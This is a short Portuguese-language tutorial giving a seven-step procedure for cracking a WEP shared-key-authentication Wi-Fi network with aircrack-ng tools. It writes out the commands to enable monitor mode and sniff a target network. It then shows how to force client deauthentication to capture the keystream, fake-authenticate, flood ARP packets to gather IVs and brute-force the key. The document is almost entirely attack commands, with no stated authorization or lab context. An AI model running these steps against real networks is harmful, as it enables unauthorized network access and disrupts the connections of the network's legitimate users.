## Atacando WEP SKA

#### 1° passo:

Colocar a placa em monitor mode

 ``` airmon-ng start <interface> ```

#### 2° passo:

Sniffar as redes ao redor e identificar o alvo

 ``` airodump-ng <interface> ```


#### 3° passo:

Focar o sniffing na rede alvo para capturar o trafego...

 ``` airodump-ng --bssid BSSID --channel CHANNEL <interface> -w CAPNAME ```


#### 4° passo:

Capturar a Key Stream. Para isso podemos esperar um client se  desautenticar e autenticar novamente ou podemos forçar um client se desautenticar...

 ``` aireplay-ng -0 3 -a BSSIDAP -c BSSIDCLIENT <inetrface> ```
 
* Se o deauth for bem sucedido aparecera um arquivo .xor com a key stream...


#### 5° passo:

Efetuar uma Fake Authentication com o arquivo .xor

 ``` aireplay-ng -1 0 -a BSSIDAP -y arquivo.xor <interface> ```
 

#### 6° passo:

Com a Fake Auth feita podemos bombardear o fake client com pacotes ARP e assim gerar muitos iv's

 ``` aireplay-ng -3 -b BSSIDAP -h BSSIDFAKECLIENT <interface> ```
 
* Depois de começar o envio dos pacotes ARP forjados fique de olho no campo #Data que está no terminal do airodump. Este valor precisa ir até a faixa dos 40/50 mil dados, talvez mais (demora um pouco).


#### 7° passo:

Quebrar o WEP por brute force

 ``` aircrack-ng -a 1 arquivo.cap ```
 
